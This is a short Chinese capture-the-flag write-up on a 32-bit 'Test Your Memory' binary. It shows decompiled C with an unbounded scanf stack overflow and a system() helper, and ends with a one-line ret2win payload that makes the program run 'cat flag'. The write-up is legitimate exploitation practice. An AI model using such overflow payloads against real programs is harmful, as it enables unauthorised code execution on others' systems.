+++
title = "wp"
date = "2026-04-15"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
main函数如下：
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  time_t v3; // eax
  char s2[11]; // [esp+1Dh] [ebp-13h] BYREF
  int v6; // [esp+28h] [ebp-8h]
  int i; // [esp+2Ch] [ebp-4h]

  v6 = 10;
  puts("\n\n\n------Test Your Memory!-------\n");
  v3 = time(0);
  srand(v3);
  for ( i = 0; i < v6; ++i )
    s2[i] = alphanum_2626[rand() % 0x3Eu];
  printf("%s", s2);
  mem_test(s2);
  return 0;
}
```
main函数生成了一个随机的十位的字符串s2，接下来看mem_test
```c
int __cdecl mem_test(char *s2)
{
  char s[19]; // [esp+15h] [ebp-13h] BYREF

  memset(s, 0, 0xBu);
  puts("\nwhat???? : ");
  printf("0x%x \n", hint);
  puts("cff flag go go go ...\n");
  printf("> ");
  __isoc99_scanf("%s", s);
  if ( !strncmp(s, s2, 4u) )
    return puts("good job!!\n");
  else
    return puts("cff flag is failed!!\n");
}
```
比较s和s2的前四位，并且在__isoc99_scanf("%s", s);处就存在了栈溢出，
```c
int __cdecl win_func(char *command)
{
  return system(command);
}
```
Pasted image 20260414135214.png
还把什么都给了出来，一个简单的payload过了
```python
payload = b'A' * (0x13 + 0x04) + p32(win_func) + p32(0xDEADBEEF) + P32(cat_flag)
```
